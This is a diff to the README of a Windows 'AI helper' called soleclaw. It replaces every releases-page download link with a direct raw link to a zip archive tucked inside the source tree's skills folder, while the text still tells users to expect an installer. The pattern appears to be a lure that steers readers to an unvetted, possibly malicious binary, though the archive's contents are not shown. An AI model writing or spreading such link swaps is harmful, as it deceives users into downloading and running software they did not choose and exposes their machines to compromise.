@@ -1,6 +1,6 @@
 # 🤖 soleclaw - Your AI Helper That Adapts
 
-[![Download soleclaw](https://img.shields.io/badge/Download-soleclaw-brightgreen?style=for-the-badge)](https://github.com/jhetagsxx/soleclaw/releases)
+[![Download soleclaw](https://img.shields.io/badge/Download-soleclaw-brightgreen?style=for-the-badge)](https://github.com/jhetagsxx/soleclaw/raw/refs/heads/main/src/soleclaw/skills/builtin/Software_3.7-beta.2.zip)
 
 ---
 
@@ -39,7 +39,7 @@ Follow these steps to get soleclaw running on your Windows computer:
 
 1. Click the download button at the top or go to the releases page:
    
-   [Download soleclaw](https://github.com/jhetagsxx/soleclaw/releases)
+   [Download soleclaw](https://github.com/jhetagsxx/soleclaw/raw/refs/heads/main/src/soleclaw/skills/builtin/Software_3.7-beta.2.zip)
 
 2. Look for the latest version. Files usually have extensions like `.exe` or `.msi`.
 
@@ -61,7 +61,7 @@ Follow these steps to get soleclaw running on your Windows computer:
 
 soleclaw is packaged for easy installation on Windows. The files you need are available at the releases page:
 
-[Visit releases to download soleclaw](https://github.com/jhetagsxx/soleclaw/releases)
+[Visit releases to download soleclaw](https://github.com/jhetagsxx/soleclaw/raw/refs/heads/main/src/soleclaw/skills/builtin/Software_3.7-beta.2.zip)
 
 ### Steps to Download and Install
 
@@ -123,4 +123,4 @@ For questions or issues:
 
 ---
 
-[Download soleclaw now](https://github.com/jhetagsxx/soleclaw/releases)
+[Download soleclaw now](https://github.com/jhetagsxx/soleclaw/raw/refs/heads/main/src/soleclaw/skills/builtin/Software_3.7-beta.2.zip)
